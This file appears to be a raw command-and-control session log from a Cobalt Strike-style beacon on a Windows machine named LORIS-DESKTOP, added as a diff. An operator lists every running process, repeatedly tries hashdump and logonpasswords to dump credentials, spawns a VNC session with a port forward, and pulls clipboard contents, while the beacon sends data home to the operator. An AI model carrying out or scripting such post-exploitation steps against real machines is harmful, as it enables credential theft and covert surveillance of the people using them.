@@ -1,0 +1,284 @@
+10/06 13:48:23 UTC [metadata] 192.168.1.30 <- 192.168.1.30; computer: LORIS-DESKTOP; user: loris; process: beacon_x64.exe; pid: 26900; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+10/06 13:49:00 UTC [input] <heros3c> ps
+10/06 13:49:00 UTC [task] <T1057> Tasked beacon to list processes
+10/06 13:49:18 UTC [checkin] host called home, sent: 12 bytes
+10/06 13:49:18 UTC [output]
+[System Process]	0	0
+System	0	4
+Secure System	4	108
+Registry	4	156
+smss.exe	4	660
+csrss.exe	996	1008
+wininit.exe	996	964
+csrss.exe	952	972
+winlogon.exe	952	1104
+services.exe	964	1288
+LsaIso.exe	964	1328
+lsass.exe	964	1336
+svchost.exe	1288	1488
+fontdrvhost.exe	964	1516
+fontdrvhost.exe	1104	1524
+svchost.exe	1288	1628
+svchost.exe	1288	1680
+dwm.exe	1104	1744
+svchost.exe	1288	1864
+svchost.exe	1288	1944
+svchost.exe	1288	1952
+svchost.exe	1288	1960
+svchost.exe	1288	1032
+svchost.exe	1288	1188
+svchost.exe	1288	1020
+svchost.exe	1288	1436
+svchost.exe	1288	1732
+svchost.exe	1288	1756
+svchost.exe	1288	2056
+svchost.exe	1288	2140
+svchost.exe	1288	2160
+svchost.exe	1288	2400
+svchost.exe	1288	2468
+WUDFHost.exe	1288	2552
+NVDisplay.Container.exe	1288	2632
+svchost.exe	1288	2640
+svchost.exe	1288	2696
+svchost.exe	1288	2764
+svchost.exe	1288	2772
+svchost.exe	1288	2780
+svchost.exe	1288	2928
+svchost.exe	1288	2996
+Memory Compression	4	3048
+svchost.exe	1288	1724
+svchost.exe	1288	3100
+svchost.exe	1288	3108
+svchost.exe	1288	3152
+NVDisplay.Container.exe	2632	3372
+svchost.exe	1288	3472
+svchost.exe	1288	3480
+svchost.exe	1288	3528
+svchost.exe	1288	3608
+svchost.exe	1288	3896
+svchost.exe	1288	4052
+svchost.exe	1288	4060
+svchost.exe	1288	3292
+svchost.exe	1288	1936
+svchost.exe	1288	3876
+scheduler.exe	1288	4140
+svchost.exe	1288	4180
+svchost.exe	1288	4232
+svchost.exe	1288	4336
+spoolsv.exe	1288	4528
+svchost.exe	1288	4648
+svchost.exe	1288	4732
+svchost.exe	1288	4816
+AdobeUpdateService.exe	1288	4828
+svchost.exe	1288	4836
+svchost.exe	1288	4848
+OfficeClickToRun.exe	1288	4868
+vmcompute.exe	1288	4876
+hamachi-2.exe	1288	4916
+svchost.exe	1288	4996
+MSPCManagerService.exe	1288	5028	x64		0
+RtkBtManServ.exe	1288	5076
+nvWmi64.exe	1288	5084
+svchost.exe	1288	4212
+vmnat.exe	1288	4356
+svchost.exe	1288	4728
+runSW.exe	1288	5132
+svchost.exe	1288	5140
+vmware-usbarbitrator64.exe	1288	5152
+vmnetdhcp.exe	1288	5172
+zerotier-one_x64.exe	1288	5204
+vmware-authd.exe	1288	5256
+LMIGuardianSvc.exe	4916	5508
+svchost.exe	1288	5604
+SwUSB.exe	5132	5720
+svchost.exe	1288	5820
+svchost.exe	1288	6076
+AggregatorHost.exe	4836	6492
+sihost.exe	2160	6148	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	6212	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	6244	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	5868	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	7312	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	7352
+FCDBLog.exe	4140	7452
+taskhostw.exe	1436	7540	x64	LORIS-DESKTOP\loris	1
+WmiPrvSE.exe	1488	8048
+svchost.exe	1288	8112
+svchost.exe	1288	8304
+FortiTray.exe	4140	8376	x64	LORIS-DESKTOP\loris	1
+FortiESNAC.exe	4140	8396
+FortiSettings.exe	4140	8416
+explorer.exe	8524	8576	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	8824
+nvWmi64.exe	5084	8940
+vmmemCmZygote	6928	9100
+svchost.exe	1288	8780	x64	LORIS-DESKTOP\loris	1
+PowerToys.exe	1436	6412	x64	LORIS-DESKTOP\loris	1
+BraveCrashHandler.exe	7616	4004
+BraveCrashHandler64.exe	7616	4972
+StartMenuExperienceHost.exe	1488	7260	x64	LORIS-DESKTOP\loris	1
+RuntimeBroker.exe	1488	8088	x64	LORIS-DESKTOP\loris	1
+RuntimeBroker.exe	1488	7560	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	6252
+svchost.exe	1288	7688	x64	LORIS-DESKTOP\loris	1
+dllhost.exe	1488	9320	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	9544
+PowerToys.AlwaysOnTop.exe	6412	10308	x64	LORIS-DESKTOP\loris	1
+PowerToys.Awake.exe	6412	10336	x64	LORIS-DESKTOP\loris	1
+PowerToys.FancyZones.exe	6412	10440	x64	LORIS-DESKTOP\loris	1
+PowerToys.KeyboardManagerEngine.exe	6412	10488	x64	LORIS-DESKTOP\loris	1
+PowerToys.MouseWithoutBorders.exe	6412	10520	x64	LORIS-DESKTOP\loris	1
+rundll32.exe	1488	10552	x64	LORIS-DESKTOP\loris	1
+TextInputHost.exe	1488	10068	x64	LORIS-DESKTOP\loris	1
+SearchIndexer.exe	1288	10376
+PowerToys.Peek.UI.exe	9300	10764	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	10764	9276	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	9276	9272	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	9276	11332	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	9276	11352	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	9276	11384	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	9276	11508	x64	LORIS-DESKTOP\loris	1
+RAVCpl64.exe	1436	11956	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	12224
+PowerToys.PowerLauncher.exe	2428	2708	x64	LORIS-DESKTOP\loris	1
+PowerToys.PowerOCR.exe	6412	2360	x64	LORIS-DESKTOP\loris	1
+ctfmon.exe	3608	4476	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	7992
+SecurityHealthSystray.exe	8576	5096	x64	LORIS-DESKTOP\loris	1
+SecurityHealthService.exe	1288	5200
+MSPCManager.exe	8576	5340	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	5340	12400	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	12400	12424	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	12400	12568	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	12400	12588	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	12400	12624	x64	LORIS-DESKTOP\loris	1
+msedgewebview2.exe	12400	12744	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	8464	x64	LORIS-DESKTOP\loris	1
+SgrmBroker.exe	1288	12072
+svchost.exe	1288	11972
+svchost.exe	1288	9832
+svchost.exe	1288	5840
+ShellExperienceHost.exe	1488	11720	x64	LORIS-DESKTOP\loris	1
+RuntimeBroker.exe	1488	6104	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	13064	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	2276
+svchost.exe	1288	8908
+svchost.exe	1288	6532
+zerotier_desktop_ui.exe	8576	7408	x64	LORIS-DESKTOP\loris	1
+explorer.exe	1488	5480	x64	LORIS-DESKTOP\loris	1
+SystemSettingsBroker.exe	1488	14868	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	16792
+svchost.exe	1288	17364
+svchost.exe	1288	15428	x64	LORIS-DESKTOP\loris	1
+audiodg.exe	3528	9872	x64		0
+Widgets.exe	1488	16112	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	17080
+dllhost.exe	1488	21692	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	22132
+nearby_share.exe	6148	27832	x64	LORIS-DESKTOP\loris	1
+crashpad_handler.exe	27832	28168	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	34944
+brave.exe	8576	23844	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	25204	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	8592	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	18904	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	18940	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	14724	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	21728	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	308	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	20364	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	14880	x64	LORIS-DESKTOP\loris	1
+MoNotificationUx.exe	6332	21248	x64	LORIS-DESKTOP\loris	1
+MsMpEng.exe	1288	33528
+msedge.exe	5184	24008	x64	LORIS-DESKTOP\loris	1
+msedge.exe	24008	14892	x64	LORIS-DESKTOP\loris	1
+msedge.exe	24008	10324	x64	LORIS-DESKTOP\loris	1
+msedge.exe	24008	8312	x64	LORIS-DESKTOP\loris	1
+msedge.exe	24008	27580	x64	LORIS-DESKTOP\loris	1
+msedge.exe	24008	7520	x64	LORIS-DESKTOP\loris	1
+msedge.exe	24008	14396	x64	LORIS-DESKTOP\loris	1
+msedge.exe	24008	23448	x64	LORIS-DESKTOP\loris	1
+msedge.exe	24008	27324	x64	LORIS-DESKTOP\loris	1
+msedge.exe	24008	28612	x64	LORIS-DESKTOP\loris	1
+msedge.exe	24008	19496	x64	LORIS-DESKTOP\loris	1
+RuntimeBroker.exe	1488	19536	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	34528	x64	LORIS-DESKTOP\loris	1
+ApplicationFrameHost.exe	1488	30912	x64	LORIS-DESKTOP\loris	1
+CHXSmartScreen.exe	1488	25460	x64	LORIS-DESKTOP\loris	1
+RuntimeBroker.exe	1488	17412	x64	LORIS-DESKTOP\loris	1
+Taskmgr.exe	8576	21464	x64	LORIS-DESKTOP\loris	1
+OpenBullet2.exe	8576	14596	x64	LORIS-DESKTOP\loris	1
+conhost.exe	14596	25732	x64	LORIS-DESKTOP\loris	1
+OpenConsole.exe	1488	19984	x64	LORIS-DESKTOP\loris	1
+WindowsTerminal.exe	1488	5852	x64	LORIS-DESKTOP\loris	1
+RuntimeBroker.exe	1488	39056	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	39736
+svchost.exe	1288	21152
+SearchProtocolHost.exe	10376	28156
+Notepad.exe	8576	39832	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	28288	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	3596	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	22504	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	9148	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	22560	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	25120	x64	LORIS-DESKTOP\loris	1
+smartscreen.exe	1488	31868	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	38160	x64	LORIS-DESKTOP\loris	1
+SearchFilterHost.exe	10376	20368
+brave.exe	23844	27976	x64	LORIS-DESKTOP\loris	1
+SecHealthUI.exe	1488	17988	x64	LORIS-DESKTOP\loris	1
+RuntimeBroker.exe	1488	20764	x64	LORIS-DESKTOP\loris	1
+SecurityHealthHost.exe	1488	17512	x64	LORIS-DESKTOP\loris	1
+dllhost.exe	1488	25592	x64	LORIS-DESKTOP\loris	1
+SearchHost.exe	1488	19220	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	18688	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	20884
+SecurityHealthHost.exe	1488	33676	x64	LORIS-DESKTOP\loris	1
+PowerToys.MouseWithoutBordersHelper.exe	10520	24736	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	4224	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	19352	x64	LORIS-DESKTOP\loris	1
+brave.exe	23844	30420	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	35304
+svchost.exe	1288	21020
+svchost.exe	1288	38840
+svchost.exe	1288	22120
+beacon_x64.exe	8576	26900	x64	LORIS-DESKTOP\loris	1
+svchost.exe	1288	34056
+
+
+10/06 13:49:40 UTC [input] <heros3c> hashdump
+10/06 13:49:40 UTC [error] this command requires administrator privileges
+10/06 13:51:11 UTC [input] <heros3c> process_browser
+10/06 13:51:11 UTC [task] <> Tasked beacon to list processes (from Process Browser)
+10/06 13:51:18 UTC [checkin] host called home, sent: 12 bytes
+10/06 13:51:53 UTC [input] <heros3c> logonpasswords
+10/06 13:51:53 UTC [error] logonpasswords error: this command requires administrator privileges
+10/06 13:52:13 UTC [input] <heros3c> logonpasswords
+10/06 13:52:13 UTC [error] logonpasswords error: this command requires administrator privileges
+10/06 13:53:38 UTC [input] <heros3c> desktop
+10/06 13:53:39 UTC [task] <> Tasked beacon to spawn VNC server
+10/06 13:54:19 UTC [checkin] host called home, sent: 374810 bytes
+10/06 13:54:19 UTC [output]
+started port forward on 8932 to 127.0.0.1:8932
+
+10/06 13:59:29 UTC [input] <heros3c> clipboard
+10/06 13:59:29 UTC [task] <> Tasked beacon to get clipboard contents
+10/06 13:59:29 UTC [checkin] host called home, sent: 1522 bytes
+10/06 13:59:29 UTC [output]
+received output:
+Clipboard Data (0 bytes):
+
+
+10/06 13:59:51 UTC [input] <heros3c> clipboard
+10/06 13:59:51 UTC [task] <> Tasked beacon to get clipboard contents
+10/06 13:59:52 UTC [checkin] host called home, sent: 1488 bytes
+10/06 13:59:52 UTC [output]
+received output:
+Clipboard Data (41 bytes):
+p -XX:+UseParallelGC -javaagent:uHook.jar
+
+10/06 14:00:02 UTC [input] <heros3c> logonpasswords
+10/06 14:00:02 UTC [error] logonpasswords error: this command requires administrator privileges
+10/06 14:01:56 UTC [output]
+stopped proxy pivot on 8932
+
